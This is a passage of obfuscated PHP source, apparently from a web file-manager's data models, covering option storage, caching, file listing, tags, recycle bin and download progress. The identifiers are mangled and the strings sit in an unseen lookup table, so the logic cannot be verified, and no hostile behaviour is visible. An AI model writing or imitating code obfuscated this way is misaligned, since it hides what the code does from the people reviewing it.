$œ¥öÕí£[$–´¨×Öâ[1806]] = $¼ıõìÙ[$–´¨×Öâ[32]]; break; case $–´¨×Öâ[649]: $Ä¤¾‡—« = intval($ª×«¦†Ğ[$–´¨×Öâ[465]] * 0.4); break; case $–´¨×Öâ[651]: $Ä¤¾‡—« = intval($ª×«¦†Ğ[$–´¨×Öâ[465]] * 0.2); break; case $–´¨×Öâ[653]: $Ä¤¾‡—« = intval($ª×«¦†Ğ[$–´¨×Öâ[465]] * 0.4); break; } $this->update($Ä¤¾‡—«); $this->sourceModelCopyFlag = !1; } public function sourceRemove($à¿å¼‚¼, $ø¸ü·˜å) { $ØŞàÚ€¢ =& $_SERVER[£ğ°ÖØø]; $this->sourceModelCopyFlag = !0; $õ–»ÑƒŞ = 1; if (isset($à¿å¼‚¼[$ØŞàÚ€¢[82]])) { $õ–»ÑƒŞ = $à¿å¼‚¼[$ØŞàÚ€¢[82]][$ØŞàÚ€¢[80]]; $õ–»ÑƒŞ = $õ–»ÑƒŞ + $à¿å¼‚¼[$ØŞàÚ€¢[82]][$ØŞàÚ€¢[81]] + 1; } $this->update($õ–»ÑƒŞ); $this->sourceModelCopyFlag = !1; } public function sourceMove($¦ÄÎìâ) { $this->sourceRemove($¦ÄÎìâ, !1); } public function curlProgress($ç¾Õ§ı¥, $î³Šù , $ÄóÛşğÇ, $ÏÊÊ…‰­, $ÈŞ·ªæø) { $‰ªÎÌí‚ =& $_SERVER[£ğ°ÖØø]; $î„¤Ôõû =& $this->task; if ($ÈŞ·ªæø > 0) { $î„¤Ôõû[$‰ªÎÌí‚[1126]] = $‰ªÎÌí‚[1828]; $î„¤Ôõû[$‰ªÎÌí‚[1810]] = $‰ªÎÌí‚[110]; if ($î„¤Ôõû[$‰ªÎÌí‚[1808]]) { $î„¤Ôõû[$‰ªÎÌí‚[1809]] = $ÈŞ·ªæø; } if ($î„¤Ôõû[$‰ªÎÌí‚[1811]]) { $î„¤Ôõû[$‰ªÎÌí‚[1809]] = $ÈŞ·ªæø + $î„¤Ôõû[$‰ªÎÌí‚[1811]]; } } else { if ($ÄóÛşğÇ > 0) { if ($î„¤Ôõû[$‰ªÎÌí‚[1808]] == $î³Šù ) { $î„¤Ôõû[$‰ªÎÌí‚[1809]] = $ÄóÛşğÇ; $î„¤Ôõû[$‰ªÎÌí‚[1126]] = $‰ªÎÌí‚[1829]; $î„¤Ôõû[$‰ªÎÌí‚[1810]] = $‰ªÎÌí‚[1262]; } } } $this->update(); } public function curlProgressStart($³ı‰ÔÑ†) { } public function curlProgressEnd($ºÛÕ®) { $ÇŒë²‰¶ =& $_SERVER[£ğ°ÖØø]; $¬¦ŸÀïÑ =& $this->task; $ÙşáÒÓÊ = curl_getinfo($ºÛÕ®); $éÉ™œ = $ÙşáÒÓÊ[$ÇŒë²‰¶[1830]]; if ($éÉ™œ == -1) { $éÉ™œ = $ÙşáÒÓÊ[$ÇŒë²‰¶[1831]]; } if ($¬¦ŸÀïÑ[$ÇŒë²‰¶[1810]] == $ÇŒë²‰¶[110] && $éÉ™œ) { $¬¦ŸÀïÑ[$ÇŒë²‰¶[1811]] += $éÉ™œ; } $this->update(); } } goto E»¨äĞÓ÷; c¯šö¸×§Ü: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\164\145\x6d\117\x70\x74\151\x6f\156"; public $field = array(); public function listData($•ÀŸò¾ = false, $†Ùàıàµ = "\155\x6f\144\x69\x66\171\124\151\155\145", $”‹¢İâ£ = false) { $»¤¾èˆï = Model($this->modelType)->get(!1, $this->optionType, !0); $¬¼ÂŠç’ = array_values($»¤¾èˆï); if ($¬¼ÂŠç’ && $¬¼ÂŠç’[0] && !is_array($¬¼ÂŠç’[0])) { Model($this->modelType)->cacheRemove($this->optionType); $»¤¾èˆï = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$»¤¾èˆï) { return $•ÀŸò¾ ? null : array(); } if (!$•ÀŸò¾) { $»¤¾èˆï = array_filter(array_values($»¤¾èˆï)); return array_sort_by($»¤¾èˆï, $†Ùàıàµ, $”‹¢İâ£); } return $»¤¾èˆï[$_SERVER[£ğ°ÖØø][481] . $•ÀŸò¾]; } public function insert($İÀğÙô) { $…¨Æ±ª… =& $_SERVER[£ğ°ÖØø]; $İÀğÙô = array_field_key($İÀğÙô, $this->field); $Ê±Šªë¦ = Model($this->modelType)->get($…¨Æ±ª…[482], $this->optionType . $…¨Æ±ª…[483]); $Ê±Šªë¦ = $Ê±Šªë¦ ? $Ê±Šªë¦ : 0; $İÀğÙô[$…¨Æ±ª…[484]] = ++$Ê±Šªë¦; $İÀğÙô[$…¨Æ±ª…[231]] = time(); $İÀğÙô[$…¨Æ±ª…[88]] = time(); Model($this->modelType)->set($…¨Æ±ª…[482], $Ê±Šªë¦, $this->optionType . $…¨Æ±ª…[483]); Model($this->modelType)->set($…¨Æ±ª…[481] . $Ê±Šªë¦, $İÀğÙô, $this->optionType); return $Ê±Šªë¦; } public function update($©Áœõ‰, $šÛ›‹) { $Âî˜ş£ã =& $_SERVER[£ğ°ÖØø]; $šÛ›‹ = array_field_key($šÛ›‹, $this->field); $¾¨“¿ŠÜ = $this->listData($©Áœõ‰); if (!$¾¨“¿ŠÜ || !$©Áœõ‰) { return !1; } $šÛ›‹ = array_merge($¾¨“¿ŠÜ, $šÛ›‹); $šÛ›‹[$Âî˜ş£ã[88]] = time(); return Model($this->modelType)->set($Âî˜ş£ã[481] . $©Áœõ‰, $šÛ›‹, $this->optionType); } public function remove($úÂ±±») { if (!$úÂ±±») { return !1; } return Model($this->modelType)->remove($_SERVER[£ğ°ÖØø][481] . $úÂ±±», $this->optionType); } public function clear() { $ÑÎ–”© =& $_SERVER[£ğ°ÖØø]; Model($this->modelType)->remove($ÑÎ–”©[482], $this->optionType . $ÑÎ–”©[483]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($˜Áã©®Ú, $áÜÖ–­ñ) { if (!$áÜÖ–­ñ) { return !1; } $Àñ˜ÛÉØ = $this->listData(); $Àñ˜ÛÉØ = array_to_keyvalue($Àñ˜ÛÉØ, $˜Áã©®Ú); return isset($Àñ˜ÛÉØ[$áÜÖ–­ñ]) ? $Àñ˜ÛÉØ[$áÜÖ–­ñ] : !1; } public function findByName($ãÙ¼Îµñ) { return $this->findByKey($_SERVER[£ğ°ÖØø][32], $ãÙ¼Îµñ); } protected function resetData($ÈŠ÷í½) { $É‡³ÂÛ³ =& $_SERVER[£ğ°ÖØø]; $ÈŠ÷í½ = is_array($ÈŠ÷í½) ? $ÈŠ÷í½ : array(); $ªö²·ø¡ = array(); for ($İ²®ÍÃ = 0; $İ²®ÍÃ < count($ÈŠ÷í½); $İ²®ÍÃ++) { $ªö²·ø¡[$É‡³ÂÛ³[481] . $ÈŠ÷í½[$İ²®ÍÃ][$É‡³ÂÛ³[484]]] = $ÈŠ÷í½[$İ²®ÍÃ]; } return Model($this->modelType)->set($ªö²·ø¡, !1, $this->optionType); } private function getAutoName($ø©²Äâ²) { $»ÜÍğäÎ = array_to_keyvalue($this->listData(), $_SERVER[£ğ°ÖØø][32]); if (!$»ÜÍğäÎ || !isset($»ÜÍğäÎ[$ø©²Äâ²])) { return $ø©²Äâ²; } for ($»¥³Å = 1; $»¥³Å < count($»ÜÍğäÎ); $»¥³Å++) { $®ºíÆ°­ = $ø©²Äâ² . "\50{$»¥³Å}\x29"; if (!isset($»ÜÍğäÎ[$®ºíÆ°­])) { return $®ºíÆ°­; } } return $®ºíÆ°­; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($à™±Êò« = false, $šš®·Ó‰ = '', $´ò³½É» = false) { $¶º¬é²ç =& $_SERVER[£ğ°ÖØø]; $¢ğšáàµ = $this->cacheGet($šš®·Ó‰); $ãµ¢®à = $this->optionDefault($šš®·Ó‰); $ãµ¢®à = is_array($ãµ¢®à) ? $ãµ¢®à : array(); if (is_array($¢ğšáàµ)) { $¢ğšáàµ = array_merge($ãµ¢®à, $¢ğšáàµ); return $à™±Êò« ? isset($¢ğšáàµ[$à™±Êò«]) ? $¢ğšáàµ[$à™±Êò«] : null : $¢ğšáàµ; } $ÄÙ˜Í« = $this->filterWhere(array($¶º¬é²ç[33] => $šš®·Ó‰)); $¢ğšáàµ = $this->where($ÄÙ˜Í«)->select(); $¢ğšáàµ = array_to_keyvalue($¢ğšáàµ, $¶º¬é²ç[97], $¶º¬é²ç[459]); foreach ($¢ğšáàµ as $·½ô™ˆÉ => $ğ‹Ÿ›¼ ) { if ($´ò³½É» || in_array($·½ô™ˆÉ, $this->jsonField)) { $¢ğšáàµ[$·½ô™ˆÉ] = json_decode($ğ‹Ÿ›¼ , !0); } } $this->cacheSet($šš®·Ó‰, $¢ğšáàµ); $¢ğšáàµ = array_merge($ãµ¢®à, $¢ğšáàµ); return $à™±Êò« ? $¢ğšáàµ[$à™±Êò«] : $¢ğšáàµ; } public function set($æÄÛèÔ, $ıñ±êş = false, $Âıä»Ä = '') { $È…¨ª¯£ =& $_SERVER[£ğ°ÖØø]; $this->cacheRemove($Âıä»Ä); $ëó×Şôˆ = array(); $·óØÖ = is_array($æÄÛèÔ) ? $æÄÛèÔ : array($æÄÛèÔ => $ıñ±êş); foreach ($·óØÖ as $ğıã„½º => $ƒ¬ÖÅ”û) { if (is_array($ƒ¬ÖÅ”û)) { $ƒ¬ÖÅ”û = json_encode_force($ƒ¬ÖÅ”û); } $this->checkLength($ƒ¬ÖÅ”û, !1, $this->tableName . $È…¨ª¯£[4] . $æÄÛèÔ); $ƒ¬ÖÅ”û = self::textEncode($ƒ¬ÖÅ”û); $·óØÖ = array($È…¨ª¯£[33] => $Âıä»Ä, $È…¨ª¯£[97] => $ğıã„½º, $È…¨ª¯£[459] => $ƒ¬ÖÅ”û); $ëó×Şôˆ[] = $this->filterWhere($·óØÖ); } if (!$ëó×Şôˆ) { return !0; } $Î²íè‰Î = $this->cacheKey($È…¨ª¯£[485]); CacheLock::lock($Î²íè‰Î); $¨Ã„ï« = $this->addAll($ëó×Şôˆ, array(), !0); CacheLock::unlock($Î²íè‰Î); return $¨Ã„ï«; } protected function optionDefault($ÓËäÎíá = '') { return !1; } public function setDeep($Í·‡‰­ø, $‘¹æóé¶ = false, $§ºàÑöê = '') { $±¸ÎÏõË = explode($_SERVER[£ğ°ÖØø][10], $Í·‡‰­ø); $îŸŸÜ™ª = $this->get(); array_set_value($îŸŸÜ™ª, $Í·‡‰­ø, $‘¹æóé¶); $this->set($±¸ÎÏõË[0], $îŸŸÜ™ª[$±¸ÎÏõË[0]], $§ºàÑöê); } public function remove($³·’¢Ú, $º ¢—şĞ = '') { $²Úî­à¤ =& $_SERVER[£ğ°ÖØø]; $this->cacheRemove($º ¢—şĞ); $½¸£ßê‘ = $this->filterWhere(array($²Úî­à¤[97] => $³·’¢Ú, $²Úî­à¤[33] => $º ¢—şĞ)); if (is_null($³·’¢Ú)) { unset($½¸£ßê‘[$²Úî­à¤[97]]); } return $this->where($½¸£ßê‘)->delete(); } public function cacheSet($À³¡æ¶ß, $¼ì¨ÛÑ’ = false) { return Cache::set($this->cacheKey($À³¡æ¶ß), $¼ì¨ÛÑ’); } public function cacheGet($¾¬·èşé) { return Cache::get($this->cacheKey($¾¬·èşé)); } public function cacheRemove($ÆâŸ²ÀÃ) { return Cache::remove($this->cacheKey($ÆâŸ²ÀÃ)); } protected function filterWhere($™æ—Ş¾×) { return $™æ—Ş¾×; } protected function cacheKey($‚áŠŞÏ¦) { return $‚áŠŞÏ¦; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\141\x6d\x65" => "\x69\157\x5f\163\157\165\x72\143\x65\x5f\155\x65\x74\x61", "\x6d\x65\x74\141\106\x69\x65\x6c\144" => "\x73\x6f\165\x72\143\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\x66\171\x54\151\155\x65", "\x74\x69\x6d\x65", "\151\156\163\145\162\x74", "\x66\x75\x6e\x63\164\x69\x6f\x6e"), array("\143\162\145\141\x74\x65\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\163\x65\162\x74", "\146\x75\x6e\x63\164\151\x6f\x6e"), array("\166\x69\x65\x77\x54\x69\x6d\145", "\x74\151\155\145", "\x69\x6e\163\145\x72\x74", "\146\165\156\143\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Âä‡ãªê) { return $this->listSource(array($_SERVER[£ğ°ÖØø][486] => $Âä‡ãªê)); } public function typeName($½ŸñÖÒò) { static $Â°òŠÔ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\x65\155", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\165\x70"); return $Â°òŠÔ[$½ŸñÖÒò . $_SERVER[£ğ°ÖØø][12]]; } public function sourceListInfo($„îÑÖÇ¿, $÷€Òï€¿ = false) { $û†¶¸Õ® =& $_SERVER[£ğ°ÖØø]; $„îÑÖÇ¿ = $„îÑÖÇ¿ ? $„îÑÖÇ¿ : array(); $„îÑÖÇ¿ = array_filter(array_unique($„îÑÖÇ¿)); if (!$„îÑÖÇ¿) { return array(); } $¦ğ“•ÃÙ = $this->where(array($û†¶¸Õ®[193] => array($û†¶¸Õ®[7], $„îÑÖÇ¿)))->select(); $this->_listDataApply($¦ğ“•ÃÙ, $÷€Òï€¿); return array_to_keyvalue($¦ğ“•ÃÙ, $û†¶¸Õ®[193]); } public function pathInfoFilter(&$ÈîÊÄÃ¡) { $´šÔ¿¿Ä =& $_SERVER[£ğ°ÖØø]; static $ ºÈ÷¿š = false; static $…ƒƒ¥áß = false; static $úÑë÷‘Ç = false; if (!$ ºÈ÷¿š) { $ÏâËŠ¼„ = $´šÔ¿¿Ä[487]; $ÏâËŠ¼„ .= $´šÔ¿¿Ä[488]; $ÏâËŠ¼„ .= $´šÔ¿¿Ä[489]; $¬±ªé”³ = $´šÔ¿¿Ä[490]; $ÎÁõŞé = explode($´šÔ¿¿Ä[50], $¬±ªé”³); $ ºÈ÷¿š = explode($´šÔ¿¿Ä[50], $ÏâËŠ¼„); $…ƒƒ¥áß = array(); foreach ($ ºÈ÷¿š as $ÔÓêäı) { if (in_array($ÔÓêäı, $ÎÁõŞé)) { continue; } $…ƒƒ¥áß[] = $ÔÓêäı; } $úÑë÷‘Ç = explode($´šÔ¿¿Ä[50], $´šÔ¿¿Ä[491]); } foreach ($úÑë÷‘Ç as $è°†¼¬) { if (isset($ÈîÊÄÃ¡[$è°†¼¬])) { $ÈîÊÄÃ¡[$è°†¼¬] = intval($ÈîÊÄÃ¡[$è°†¼¬]); } } $ÈîÊÄÃ¡[$´šÔ¿¿Ä[87]] = $´šÔ¿¿Ä[492] . $ÈîÊÄÃ¡[$´šÔ¿¿Ä[193]] . $´šÔ¿¿Ä[493]; $ÈîÊÄÃ¡[$´šÔ¿¿Ä[33]] = $ÈîÊÄÃ¡[$´šÔ¿¿Ä[494]] == 1 ? $´šÔ¿¿Ä[78] : $´šÔ¿¿Ä[230]; $ÈîÊÄÃ¡[$´šÔ¿¿Ä[190]] = $this->typeName($ÈîÊÄÃ¡[$´šÔ¿¿Ä[190]]); if ($ÈîÊÄÃ¡[$´šÔ¿¿Ä[494]] != 1) { $ÈîÊÄÃ¡[$´šÔ¿¿Ä[169]] = $ÈîÊÄÃ¡[$´šÔ¿¿Ä[495]]; unset($ÈîÊÄÃ¡[$´šÔ¿¿Ä[495]]); } $–«›¾§ = $ ºÈ÷¿š; if (isset($ÈîÊÄÃ¡[$´šÔ¿¿Ä[496]]) && $ÈîÊÄÃ¡[$´šÔ¿¿Ä[496]][$´šÔ¿¿Ä[497]] == -1) { $–«›¾§ = $…ƒƒ¥áß; } $ÈîÊÄÃ¡ = array_field_key($ÈîÊÄÃ¡, $–«›¾§); return $ÈîÊÄÃ¡; } public function listUserFav() { $å˜Å€½› =& $_SERVER[£ğ°ÖØø]; $‚ËéÛ¡× = Model($å˜Å€½›[498])->listData(); $¬õü¾ù¾ = array_filter_by_field($‚ËéÛ¡×, $å˜Å€½›[33], $å˜Å€½›[499]); $¬õü¾ù¾ = array_to_keyvalue($¬õü¾ù¾, $å˜Å€½›[12], $å˜Å€½›[87]); if ($¬õü¾ù¾) { $ªäŸŞÉò = $this->listSource(array($å˜Å€½›[500] => array($å˜Å€½›[501], $¬õü¾ù¾))); } $ªäŸŞÉò = array_to_keyvalue($ªäŸŞÉò[$å˜Å€½›[454]], $å˜Å€½›[193]); foreach ($‚ËéÛ¡× as &$’³Ìö°à) { $’³Ìö°à = array($å˜Å€½›[502] => $’³Ìö°à[$å˜Å€½›[484]], $å˜Å€½›[503] => $’³Ìö°à[$å˜Å€½›[32]], $å˜Å€½›[504] => $’³Ìö°à[$å˜Å€½›[87]], $å˜Å€½›[505] => $’³Ìö°à[$å˜Å€½›[33]], $å˜Å€½›[506] => $’³Ìö°à[$å˜Å€½›[231]], $å˜Å€½›[507] => $’³Ìö°à[$å˜Å€½›[88]]); if ($’³Ìö°à[$å˜Å€½›[33]] == $å˜Å€½›[499] && $ªäŸŞÉò[$’³Ìö°à[$å˜Å€½›[87]]]) { $’³Ìö°à[$å˜Å€½›[90]] = $ªäŸŞÉò[$’³Ìö°à[$å˜Å€½›[87]]]; } } unset($’³Ìö°à); return $‚ËéÛ¡×; } public function listUserTag($«ØĞ„‡») { $åÚ·†Ü… =& $_SERVER[£ğ°ÖØø]; if ($«ØĞ„‡» && !is_array($«ØĞ„‡»)) { $«ØĞ„‡» = array($«ØĞ„‡»); } $É±ø¿ÃÂ = Model($åÚ·†Ü…[508])->listData(); $’àí§¼ = array(); $ïæàåÎ = array(); foreach ($É±ø¿ÃÂ as $›ªæ ²©) { $ÄËã¡› = $›ªæ ²©[$åÚ·†Ü…[87]]; if (!$ÄËã¡›) { continue; } if (!isset($ïæàåÎ[$ÄËã¡›])) { $ïæàåÎ[$ÄËã¡›] = array(); } $ïæàåÎ[$ÄËã¡›][] = $›ªæ ²©[$åÚ·†Ü…[509]]; $’àí§¼[$›ªæ ²©[$åÚ·†Ü…[87]]] = $›ªæ ²©; } $÷³óøâÈ = array(); $á “ÓßÂ = array(); $ç§ùÖ¥ = array(); foreach ($ïæàåÎ as $Ù±òà½¾ => $ì™£Áıç) { $ÃÅ³ĞÒ† = !0; if (!$«ØĞ„‡») { $÷³óøâÈ[] = $Ù±òà½¾; continue; } foreach ($«ØĞ„‡» as $À¢ëèôˆ) { if (!in_array($À¢ëèôˆ, $ì™£Áıç)) { $ÃÅ³ĞÒ† = !1; break; } } if (!$ÃÅ³ĞÒ†) { continue; } if (!is_numeric($Ù±òà½¾)) { $´…Œ¤³ = $’àí§¼[$Ù±òà½¾]; $™³§Üİ™ = array($åÚ·†Ü…[32] => $´…Œ¤³[$åÚ·†Ü…[32]], $åÚ·†Ü…[87] => $´…Œ¤³[$åÚ·†Ü…[87]], $åÚ·†Ü…[33] => $´…Œ¤³[$åÚ·†Ü…[33]], $åÚ·†Ü…[90] => array($åÚ·†Ü…[510] => 1), $åÚ·†Ü…[232] => !0); if ($´…Œ¤³[$åÚ·†Ü…[33]] == $åÚ·†Ü…[230]) { $ç§ùÖ¥[] = $™³§Üİ™; } if ($´…Œ¤³[$åÚ·†Ü…[33]] == $åÚ·†Ü…[78]) { $á “ÓßÂ[] = $™³§Üİ™; } continue; } $÷³óøâÈ[] = $Ù±òà½¾; } if ($÷³óøâÈ) { $è¬ÖÒŒ = $this->listSource(array($åÚ·†Ü…[500] => array($åÚ·†Ü…[501], $÷³óøâÈ))); } $è¬ÖÒŒ = $è¬ÖÒŒ ? $è¬ÖÒŒ : array($åÚ·†Ü…[85] => array(), $åÚ·†Ü…[86] => array()); $è¬ÖÒŒ[$åÚ·†Ü…[85]] = array_merge($è¬ÖÒŒ[$åÚ·†Ü…[85]], $á “ÓßÂ); $è¬ÖÒŒ[$åÚ·†Ü…[86]] = array_merge($è¬ÖÒŒ[$åÚ·†Ü…[86]], $ç§ùÖ¥); if (isset($è¬ÖÒŒ[$åÚ·†Ü…[451]]) && count($÷³óøâÈ) == $è¬ÖÒŒ[$åÚ·†Ü…[451]][$åÚ·†Ü…[452]]) { return $è¬ÖÒŒ; } $¶ÑÚö™£ = array(); $ò™Æ¹ä‘ = array_to_keyvalue($è¬ÖÒŒ[$åÚ·†Ü…[85]], $åÚ·†Ü…[12], $åÚ·†Ü…[193]); $ïİ­ÀÏ­ = array_to_keyvalue($è¬ÖÒŒ[$åÚ·†Ü…[86]], $åÚ·†Ü…[12], $åÚ·†Ü…[193]); $¶õßİÇ” = array_merge($ïİ­ÀÏ­, $ò™Æ¹ä‘); foreach ($÷³óøâÈ as $ÄËã¡›) { if (!in_array($ÄËã¡›, $¶õßİÇ”)) { $¶ÑÚö™£[] = $ÄËã¡›; } } if ($¶ÑÚö™£) { Model($åÚ·†Ü…[511])->removeBySource($¶ÑÚö™£); } return $è¬ÖÒŒ; } public function listUserRecycle() { $Å¯µî¥ï =& $_SERVER[£ğ°ÖØø]; $ìš–— = Model($Å¯µî¥ï[512])->listData(); if (!$ìš–—) { return array(); } $ô€ì–œ¨ = array($Å¯µî¥ï[500] => array($Å¯µî¥ï[501], $ìš–—), $Å¯µî¥ï[513] => 1); return $this->listSource($ô€ì–œ¨); } public function listSource($ñ¹ºãÆø, $°¿ƒ¤Ëô = 3000, $ÆÏ•Á¼ = false) { $‡×«¹ÊÉ =& $_SERVER[£ğ°ÖØø]; if (!isset($ñ¹ºãÆø[$‡×«¹ÊÉ[514]])) { $ñ¹ºãÆø[$‡×«¹ÊÉ[514]] = 0; } if (isset($ñ¹ºãÆø[$‡×«¹ÊÉ[192]]) && $ñ¹ºãÆø[$‡×«¹ÊÉ[192]] == $‡×«¹ÊÉ[228]) { $ñ¹ºãÆø[$‡×«¹ÊÉ[495]] = array($‡×«¹ÊÉ[407], $‡×«¹ÊÉ[515]); } $ê×»¿¯Ÿ = $‡×«¹ÊÉ[516]; $¸ÁõÌ…Š = $this->field($ê×»¿¯Ÿ)->_makeOrder()->where($ñ¹ºãÆø)->selectPage($°¿ƒ¤Ëô); $this->_listPageCheck($¸ÁõÌ…Š, $ê×»¿¯Ÿ, $ñ¹ºãÆø); $this->_listDataApply($¸ÁõÌ…Š[$‡×«¹ÊÉ[454]], $ÆÏ•Á¼); $this->_listMake($¸ÁõÌ…Š); return $¸ÁõÌ…Š; } private function _listPageCheck(&$–Ãëàã†, $ÅúçÕè, $å³ôÏó) { $ª¼Ü¾…ô =& $_SERVER[£ğ°ÖØø]; if (!is_array($–Ãëàã†[$ª¼Ü¾…ô[451]])) { return; } $ØÅÄÙû€ = $–Ãëàã†[$ª¼Ü¾…ô[451]]; if ($ØÅÄÙû€[$ª¼Ü¾…ô[453]] <= 1) { return; } if ($ØÅÄÙû€[$ª¼Ü¾…ô[452]] >= 100000) { return; } if (Model($ª¼Ü¾…ô[517])->get($ª¼Ü¾…ô[518]) != $ª¼Ü¾…ô[519]) { return; } $ÅúçÕè = str_replace(array($ª¼Ü¾…ô[53], $ª¼Ü¾…ô[418], $ª¼Ü¾…ô[262]), $ª¼Ü¾…ô[12], $ÅúçÕè); $ÅúçÕè = $ª¼Ü¾…ô[520] . str_replace($ª¼Ü¾…ô[50], $ª¼Ü¾…ô[521], $ÅúçÕè) . $ª¼Ü¾…ô[522]; $áĞĞ·Ôæ = $ª¼Ü¾…ô[523]; $áĞĞ·Ôæ = $áĞĞ·Ôæ . $ª¼Ü¾…ô[524]; $­Åü‰« = $ØÅÄÙû€[$ª¼Ü¾…ô[448]] * ($ØÅÄÙû€[$ª¼Ü¾…ô[429]] - 1) . $ª¼Ü¾…ô[50] . $ØÅÄÙû€[$ª¼Ü¾…ô[448]]; $¬î£ÔÁ = $this->_makeOrder(!0); $†àÄßÙü = $ª¼Ü¾…ô[520] . str_replace($ª¼Ü¾…ô[50], $ª¼Ü¾…ô[521], $¬î£ÔÁ[0]); if (strpos($†àÄßÙü, $ª¼Ü¾…ô[525])) { $†àÄßÙü = str_replace($ª¼Ü¾…ô[525], $ª¼Ü¾…ô[526], $†àÄßÙü); } else { $†àÄßÙü .= $ª¼Ü¾…ô[527] . $¬î£ÔÁ[1]; } $¬Ïó‘Á¸ = array(); foreach ($å³ôÏó as $Ùä×–ôè => $œ¼ÎîÆÛ) { $¬Ïó‘Á¸[$ª¼Ü¾…ô[520] . $Ùä×–ôè] = $œ¼ÎîÆÛ; } $this->alias($ª¼Ü¾…ô[528])->field($ÅúçÕè)->limit($­Åü‰«)->order($†àÄßÙü); $Ú™¼ğŒ¨ = $this->join($áĞĞ·Ôæ)->where($¬Ïó‘Á¸)->select(); if ($Ú™¼ğŒ¨) { $–Ãëàã†[$ª¼Ü¾…ô[454]] = $Ú™¼ğŒ¨; } } protected function _makeOrder($°‰•äâ = false) { $ªä‡íéÕ =& $_SERVER[£ğ°ÖØø]; $öâ¦û‘ = Model($ªä‡íéÕ[529])->get($ªä‡íéÕ[530]); $¬Ñâì€Æ = Model($ªä‡íéÕ[529])->get($ªä‡íéÕ[531]); $Ãê¬×¦Û = array($ªä‡íéÕ[532] => $ªä‡íéÕ[533], $ªä‡íéÕ[534] => $ªä‡íéÕ[535]); $ĞÙÓÇâ½ = array($ªä‡íéÕ[32] => $ªä‡íéÕ[32], $ªä‡íéÕ[79] => $ªä‡íéÕ[79], $ªä‡íéÕ[169] => $ªä‡íéÕ[495], $ªä‡íéÕ[536] => $ªä‡íéÕ[536], $ªä‡íéÕ[537] => $ªä‡íéÕ[538], $ªä‡íéÕ[231] => $ªä‡íéÕ[231], $ªä‡íéÕ[88] => $ªä‡íéÕ[88]); $ÂÛåÛ¹ = Input::get($ªä‡íéÕ[539], $ªä‡íéÕ[7], $öâ¦û‘, array_keys($ĞÙÓÇâ½)); $‚Ìà¯¯ = Input::get($ªä‡íéÕ[540], $ªä‡íéÕ[7], $¬Ñâì€Æ, array_keys($Ãê¬×¦Û)); if (!in_array($ÂÛåÛ¹, array_keys($ĞÙÓÇâ½))) { $ÂÛåÛ¹ = $ªä‡íéÕ[32]; } if (!in_array($‚Ìà¯¯, array_keys($Ãê¬×¦Û))) { $ÂÛåÛ¹ = $ªä‡íéÕ[532]; } if ($ÂÛåÛ¹ == $ªä‡íéÕ[32]) { } $šÎ½ÉŞ• = $ªä‡íéÕ[541] . $ĞÙÓÇâ½[$ÂÛåÛ¹] . $ªä‡íéÕ[53] . $Ãê¬×¦Û[$‚Ìà¯¯]; $šÎ½ÉŞ• = rtrim(trim($šÎ½ÉŞ•), $ªä‡íéÕ[50]); if ($°‰•äâ) { return array($šÎ½ÉŞ•, $Ãê¬×¦Û[$‚Ìà¯¯]); } return $this->order($šÎ½ÉŞ•); } protected function _listDataApplyItem($§×ê€Õ¦, $™ù“ãüü = false) { $•Á«•òƒ = array($§×ê€Õ¦); $this->_listDataApply($•Á«•òƒ, $™ù“ãüü); return $•Á«•òƒ[0]; } protected function _listDataApply(&$Óş¿äû˜, $İşçˆ»¶ = false) { $„‘‚á¯Å =& $_SERVER[£ğ°ÖØø]; if (!$Óş¿äû˜) { $Óş¿äû˜ = array(); return; } $±ê¢ñ› = array_to_keyvalue($Óş¿äû˜, $„‘‚á¯Å[12], $„‘‚á¯Å[193]); $±ê¢ñ› = array_unique($±ê¢ñ›); $this->_listSourceCache($Óş¿äû˜); if (!$İşçˆ»¶) { $this->_listAppendMeta($Óş¿äû˜, $±ê¢ñ›); $this->_listAppendFileMeta($Óş¿äû˜, $±ê¢ñ›); $this->_listAppendChildren($Óş¿äû˜, $±ê¢ñ›); } $this->_listAppendPath($Óş¿äû˜); $this->_listAppendAuth($Óş¿äû˜); $this->_listAppendSourceInfo($Óş¿äû˜, $±ê¢ñ›); $this->_listAppendUser($Óş¿äû˜); $this->_listFilterInfo($Óş¿äû˜, $İşçˆ»¶); $this->_listAppendAuthSecret($Óş¿äû˜); } protected function _listSourceCache($‹ÔïğàÍ) { $îšš—íŞ =& $_SERVER[£ğ°ÖØø]; foreach ($‹ÔïğàÍ as $ùîø‰ÍÉ) { self::$cacheSourceInfo[$îšš—íŞ[542] . $ùîø‰ÍÉ[$îšš—íŞ[193]]] = $ùîø‰ÍÉ; } } protected function _listFilterInfo(&$‡íÅ€ÇŒ, $êµÑ¤í = false) { $ÜÔ¿“ı =& $_SERVER[£ğ°ÖØø]; foreach ($‡íÅ€ÇŒ as &$¯Æ—ûã¬) { $¯Æ—ûã¬ = $this->pathInfoFilter($¯Æ—ûã¬); self::$cachePathInfo[$ÜÔ¿“ı[543] . intval($êµÑ¤í) . $ÜÔ¿“ı[471] . $¯Æ—ûã¬[$ÜÔ¿“ı[193]]] = $¯Æ—ûã¬; } unset($¯Æ—ûã¬); } protected function _listMake(&$®Ââ´‹À) { $‚âÍ†’‚ =& $_SERVER[£ğ°ÖØø]; $®Ââ´‹À[$‚âÍ†’‚[85]] = array(); $®Ââ´‹À[$‚âÍ†’‚[86]] = array(); foreach ($®Ââ´‹À[$‚âÍ†’‚[454]] as $¤à®éó¨) { $å¨€¦¯à = $¤à®éó¨[$‚âÍ†’‚[494]] == 1 ? $‚âÍ†’‚[85] : $‚âÍ†’‚[86]; $®Ââ´‹À[$å¨€¦¯à][] = $¤à®éó¨; } unset($®Ââ´‹À[$‚âÍ†’‚[454]]); } protected function _listAppendMeta(&$Ûú¶Îñ, $©ÀŒâµ˜) { $å 